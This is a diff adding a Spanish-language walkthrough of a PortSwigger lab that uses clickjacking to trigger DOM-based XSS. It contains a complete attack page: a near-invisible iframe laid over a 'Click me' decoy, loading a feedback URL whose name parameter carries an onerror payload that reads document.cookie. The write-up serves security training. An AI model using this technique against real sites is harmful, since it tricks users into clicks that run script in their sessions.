@@ -480,6 +480,32 @@ La solución a este laboratorio es la misma que el anterior, pero agregando el a
 <iframe sandbox="allow-forms" src="https://ac791f371e807c5c8070fc3c01b80050.web-security-academy.net/email?email=alguien@algo.com"></iframe>
 ```
 
+### [Exploiting clickjacking vulnerability to trigger DOM-based XSS](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)
+
+Este laboratorio contiene una vulnerabilidad XSS que se activa con un click. El objetivo es construir un ataque de clickjacking para ejecutar un XSS payload que imprime un alert con el contenido de document.cookie.
+
+Al ir a la sección Submit Feedback y enviar un formulario, vemos que se imprime el nombre, por lo que se puede buscar el XSS mediante el envío de dicho parámetro como se muestra a continuación:
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top:620px;
+        left: 80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://acc01f561e12d7bb8043912700a00045.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=alguien@algo.com&subject=alguno&message=hello#feedbackResult"></iframe>
+```
+
 ---
 
 ## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
